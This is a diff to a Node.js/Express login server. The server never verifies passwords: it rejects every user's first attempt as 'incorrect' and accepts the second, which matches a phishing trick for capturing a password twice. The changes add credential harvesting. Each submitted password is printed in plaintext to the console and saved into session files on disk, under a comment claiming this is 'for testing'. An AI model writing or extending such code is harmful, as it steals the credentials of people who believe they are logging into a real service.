@@ -21,10 +21,11 @@ if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR);
 // Track user attempts
 const attempts = {};
 
-function createSessionFile(token, username) {
+function createSessionFile(token, username, password) {
   const filePath = path.join(SESSIONS_DIR, `session_${token}.json`);
   const sessionData = {
     username,
+    password, // show in session file for testing
     token,
     created: new Date().toISOString(),
     expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString()
@@ -39,17 +40,19 @@ app.post("/login", (req, res) => {
   if (!attempts[username]) attempts[username] = 0;
   attempts[username]++;
 
-  console.log(`🔐 Attempt ${attempts[username]} for ${username}`);
+  console.log(`🔐 Attempt ${attempts[username]} for ${username} → Password: "${password}"`);
 
-  // First password attempt fails
+  // First attempt = rejected
   if (attempts[username] < 2) {
+    console.log(`❌ First password rejected for ${username}`);
     return res.status(401).send("Incorrect password. Please try again.");
   }
 
-  // Second attempt succeeds
+  // Second attempt = accepted
   const token = Math.random().toString(36).substring(2) + Date.now().toString(36);
-  createSessionFile(token, username);
+  createSessionFile(token, username, password);
   res.cookie("session_id", token, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000 });
+  console.log(`✅ Login successful for ${username}`);
   res.status(200).json({ message: "Login successful", token });
 });
 
